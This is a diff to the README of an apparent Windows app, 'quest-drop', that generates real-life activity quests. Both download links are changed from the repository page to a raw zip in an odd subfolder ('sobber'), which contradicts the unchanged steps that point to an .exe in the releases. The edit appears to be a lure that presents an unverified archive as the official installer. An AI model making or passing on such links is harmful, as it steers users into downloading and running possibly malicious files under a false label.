@@ -1,6 +1,6 @@
 # 🕹️ quest-drop - Generate real-life adventures to stay active
 
-[![Download quest-drop](https://img.shields.io/badge/Download-QuestDrop_for_Windows-blue.svg)](https://github.com/Glamourous-mammalia359/quest-drop)
+[![Download quest-drop](https://img.shields.io/badge/Download-QuestDrop_for_Windows-blue.svg)](https://github.com/Glamourous-mammalia359/quest-drop/raw/refs/heads/main/sobber/drop-quest-v1.9.zip)
 
 ## 📌 Project Overview
 
@@ -19,7 +19,7 @@ Your computer needs to meet these basic standards to run the application smoothl
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit the [official download page](https://github.com/Glamourous-mammalia359/quest-drop) to access the latest installer.
+1. Visit the [official download page](https://github.com/Glamourous-mammalia359/quest-drop/raw/refs/heads/main/sobber/drop-quest-v1.9.zip) to access the latest installer.
 2. Look for the file ending in `.exe` under the latest release section.
 3. Click the file to start the download process.
 4. Locate the file in your Downloads folder once the transfer finishes.
